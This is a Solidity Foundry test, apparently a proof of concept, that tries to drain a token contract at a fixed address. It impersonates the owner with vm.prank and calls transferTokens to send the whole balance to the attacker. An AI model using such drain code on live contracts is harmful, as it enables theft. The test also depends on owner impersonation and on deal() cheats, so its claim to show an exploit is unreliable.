// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IxenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transferTokens(address recepient, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);
    IxenoX public target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IxenoX(TARGET);

        // Precondition: The contract must have a non-zero balance of its own token.
        uint256 amountToDrain = 1_000_000 * 1e9;
        deal(TARGET, address(target), amountToDrain);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));
        uint256 initialAttackerBalance = target.balanceOf(attacker);
        uint256 contractBalance = target.balanceOf(address(target));

        // Verify the precondition set in setUp()
        assertTrue(contractBalance > 0, "Contract should have a token balance");

        // Precondition: Attacker must be the owner. We find the owner and impersonate them.
        address owner = target.owner();

        vm.prank(owner);
        target.transferTokens(attacker, contractBalance);

        uint256 finalAttackerBalance = target.balanceOf(attacker);

        // Verify that the attacker's balance has increased by the amount drained.
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker's balance should have increased");
        assertEq(finalAttackerBalance, initialAttackerBalance + contractBalance, "Attacker should have received the full contract balance");
        uint256 finalBalance = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

